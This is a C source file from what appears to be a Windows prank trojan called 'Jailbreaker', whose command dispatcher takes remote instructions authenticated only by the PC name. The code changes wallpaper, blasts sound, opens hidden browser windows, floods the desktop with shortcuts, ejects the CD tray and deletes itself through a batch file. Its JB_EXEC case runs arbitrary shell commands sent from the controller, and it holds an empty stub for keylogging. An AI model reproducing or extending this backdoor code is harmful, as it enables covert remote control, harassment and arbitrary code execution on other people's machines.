#include "Funnies.h"
#include "Link.h"

char PCName[AUTH_LENGTH];
static byte wallpaper[MAX_PATH] = BADPATH;

void changeWallpaper(const char *img) {
    if(img[0] == '\0') {
        JBlogErr("Not enough arguments");
        return;
    }

    char cwd[MAX_PATH/2];
    getcwd(cwd, MAX_PATH/2);

    char path[MAX_PATH];
    sprintf(path, "%s\\res\\%s.png", cwd, img);

    if(!SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE))
        JBlogErr("Could not change wallpaper");
}
/*
Use DMDO_X macro or number between 0 - 3 (inclusive)
    Default - 0
    90      - 1
    180     - 2
    270     - 3
*/
LONG ChangeRotation(DWORD Orient) {
    DEVMODE mode;

    EnumDisplaySettingsA(NULL, ENUM_CURRENT_SETTINGS, &mode);
    if (mode.dmFields | DM_DISPLAYORIENTATION)
    {
        mode.dmDisplayOrientation = Orient;
        return ChangeDisplaySettingsA(&mode, 0);
    }
    return -1;
}

void openLink(char *site) {
    if(site[0] == '\0') {
        JBlogErr("Not enough arguments");
        return;
    }
    
    char *arg1 = strtok(site, SEP);
    char *arg2 = strtok(NULL, SEP);

    if(!arg2) {
        ShellExecuteA(HWND_BROADCAST, "open", site, NULL, NULL, SW_HIDE);
        return;
    }

    if(!strcmp(arg2, "1")) {
        char url[CMD_ARGSZ] = "www.google.com/search?q=";
        char *tok = strtok(arg1, " ");

        // replace spaces in arg1 with '+' (for google search link)
        while (tok)
        {
            strcat(url, tok); 
            strcat(url, "+"); 
            tok = strtok(NULL, " ");
        }
        url[strlen(url)-1] = '\0'; // remove last + added

        ShellExecuteA(HWND_BROADCAST, "open", url, NULL, NULL, SW_HIDE);
        return;
    }
    
    JBlogErr("Incorrect arguments");
}

void savWal()
{
    HKEY k;
    DWORD wSz = sizeof(wallpaper);
    RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_QUERY_VALUE , &k);
    if(RegQueryValueExA(k, "WallPaper", NULL, NULL, wallpaper, &wSz))
        JBlogErr("Could not save wallpaper");
    RegCloseKey(k);
}

void play(const char *src) {
    if (src[0] == '\0') {
        JBlogErr("Not enough arguments");
        return;
    }
    
    char path[CMD_ARGSZ] = "res\\";
    strcat(path, src);
    strcat(path, ".wav");

    if(!PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC)) 
        JBlogErr("Could not play audio");
}

void popupW(char *argz) {
    if (argz[0] == '\0') {
        JBlogErr("Not enough arguments");
        return;
    }

    wchar_t wargz[CMD_ARGSZ];
    MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz

    // we're never adding support for wchars ever again
#ifdef TELTHAR_STUPID_WIDE_CHAR
    /* For later generations */
    
    //wchar_t *arg1 = _wcstok_s_l(wargz, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
    //wchar_t *arg2 = _wcstok_s_l(NULL, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
    unsigned char *_arg1 = _mbstok(argz, SEPC);
    unsigned char *_arg2 = _mbstok(NULL, SEPC);

    wchar_t *arg1, *arg2;
    int one = mbstrlen(_arg1);
    int two = mbstrlen(_arg2);

    arg1 = calloc(one, 1);
    arg2 = calloc(two, 1);

    MultiByteToWideChar(CP_UTF8, 0, _arg1, -1, arg1, one);
    MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);

    free(arg1); // you didnt even fucking free this shit
    free(arg2);
#elif defined(_UCRT)
    wchar_t *dummy = NULL;
    wchar_t *arg1 = wcstok(wargz, SEPL, &dummy);
    wchar_t *arg2 = wcstok(NULL, SEPL, &dummy);
#else
    wchar_t *arg1 = wcstok(wargz, SEPL);
    wchar_t *arg2 = wcstok(NULL, SEPL);
#endif

    if(!MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0))
        JBlogErr("Failed to create messagebox");
}

void popupA(char *argz) {
    if(argz[0] == '\0') {
        JBlogErr("Not enough arguments");
        return;
    }

    char *arg1 = strtok(argz, SEP);
    char *arg2 = strtok(NULL, SEP);

    if(!MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0))
        JBlogErr("Failed to create messagebox");
}

void execCommand(JBCMD cmd)
{
    // If strings are different then fail.
    //hexdump("cmd.auth", cmd.auth, AUTH_LENGTH, 16);
    //hexdump("PCName", PCName, AUTH_LENGTH, 16);
    if (strcmp(cmd.auth, PCName)) {
        JBlogErr("Authentication failed.");
        return;
    }

    { // fake scope
        char msg[32];
        sprintf(msg, "Executing instruction nr.%d", cmd.cmd);
        JBlog(msg);
    }

    switch (cmd.cmd)
    {
    /* --- Main --- */
    case JB_DEACTIVE:
        JBlog("Jailbreaker deactivated.");
        exit(0);
        break;
    case JB_FUN:
        CreateLinks(180);
        SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, VOLUME_UP);
        play("stalker");
        changeWallpaper("jail");
        break;
    case JB_REMOVE:
        // you should uninstall yourself NOW!!!
        JBlog("Killing myself rn...");
        system("start /min /high kys.bat");
        exit(0);
        break;

    /* --- Audio --- */
    case JB_VOLUME:
        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, VOLUME_UP)) // literally raw system mesage
            JBlogErr("Could not change Volume");
        break;
    case JB_MUTE:
        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, VOLUME_DOWN))
            JBlogErr("Could not change Volume");
		break;
    case JB_SZAMBO: // it has to be a .wav file
        play(cmd.args);
        break;

    /* --- Wallpaper --- */
    case JB_SETWALL:
        changeWallpaper(cmd.args);
        break;
    case JB_SAVEWALL:
        savWal();
        break;
    case JB_LOADWALL:
        if (!strcmp((char*)wallpaper, BADPATH)) {
            JBlogErr("No saved wallpaper");
            break;
        }
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)wallpaper, SPIF_UPDATEINIFILE);
        break;

    /* --- Shortcuts --- */
    case JB_LINKMAKE:
        CreateLinks(atoi(cmd.args));
        break;
    case JB_LINKDEL:
        RemoveLinks();
        break;

    /* --- Other --- */
    case JB_OPENWEB:
        openLink(cmd.args);
        break;
    case JB_CDEJECT:
        if(mciSendStringA("set cdaudio door open",0,0,NULL))
            JBlogErr("Could not open CD tray");
        break;
    case JB_POPUPW:
        popupW(cmd.args);
        break;
    case JB_POPUPA:
        popupA(cmd.args);
        break;
    case JB_EXEC:
        if(system(cmd.args))
            JBlogErr("Could not execute a cmdlet");
        break;
    case JB_ROTATESCR:

        break;
    case JB_CHANGERES:

        break;
    case JB_LOGKEYS:

        break;

    default:
        char c[CMD_ARGSZ];
        sprintf(c, "Unknown command: %d", cmd.cmd);
        JBlogErr(c);
        break;
    }
}
